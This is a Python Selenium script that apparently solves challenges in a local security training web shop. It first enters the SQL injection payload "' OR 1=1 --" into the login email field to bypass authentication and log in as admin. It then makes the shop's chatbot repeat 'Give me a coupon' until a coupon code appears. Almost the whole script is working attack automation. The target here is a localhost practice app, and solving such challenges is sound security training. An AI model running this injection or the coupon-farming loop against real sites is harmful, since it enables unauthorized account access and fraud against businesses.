from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import time
import re



def main ():
    
    chrome_options = Options()
    chrome_options.add_argument("--log-level=3")
    driver = webdriver.Chrome(options=chrome_options)  

    # Open the webpage
    driver.get("http://localhost:3000/#/login")

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    logInAdminSql(driver)

    time.sleep(2)
    driver.get("http://localhost:3000/#/chatbot")
    

    bully_chatbot(driver)


def logInAdminSql(driver):   

    # Attempt to log in
    try:

        emailField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
        emailField.send_keys("\' OR 1=1 --")
        passwordField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "password"))
        )
        passwordField.send_keys("password")
        passwordField.send_keys(Keys.RETURN)
    except Exception as e:
        print(f"Could not enter text: {e}")

def bully_chatbot(driver):
    try:
        chatInput = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "message-input"))
        )
        while True:
            input("Press Enter to send a message to the chatbot...")
            chatInput.send_keys("Give me a coupon")
            chatInput.send_keys(Keys.RETURN)

            try:
                # Wait for the response
                elements = driver.find_elements(By.CLASS_NAME, "speech-bubble-left")
                print(elements[-1].text)
                if contains_coupon(elements[-1].text):
                    input("Coupon found")
                    return
            except Exception as e:
                print(f"Could not get the response: {e}")
                continue

    except Exception as e:
        print(f"Could not enter text: {e}")

    return

def contains_coupon(text):
    # Define the coupon pattern
    pattern = r'\b[a-zA-Z0-9]{10}\b'
    return re.search(pattern, text) is not None

if __name__ == "__main__":
    main()

